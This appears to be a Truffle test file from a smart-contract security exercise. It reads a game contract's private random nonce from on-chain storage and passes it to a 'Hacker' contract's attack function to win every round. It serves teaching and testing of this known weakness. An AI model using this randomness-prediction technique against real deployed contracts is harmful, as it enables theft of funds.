const Hacker = artifacts.require("Hacker");
const LevelOne = artifacts.require("LevelOne");
const { expectEvent } = require("@openzeppelin/test-helpers");
const { expect } = require("chai");
const { wonEventSignature } = require("./helpers/game_helper");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  let game, hackerContract;

  beforeEach(async function () {
    game = await LevelOne.deployed();
    await game.send(web3.utils.toWei("1", "gwei"), { from: _owner });
    hackerContract = await Hacker.deployed();
  });

  context("should win always", async function () {
    for (let i = 0; i < 10; i++) {
      it("should win", async function () {
        // Read storage of the game contract
        const randNonce = await web3.eth.getStorageAt(
          game.address, // address of the contract
          1, // index of slot - uint256 private randNonce = 0;
        );
        const result = await hackerContract.attack(game.address, randNonce, { from: _hacker, value: web3.utils.toWei("1", "gwei") });
        expect(result.receipt.status).to.equal(true);
        expectEvent.inTransaction(result.tx, game, "Won");
      });
    }
  });
});
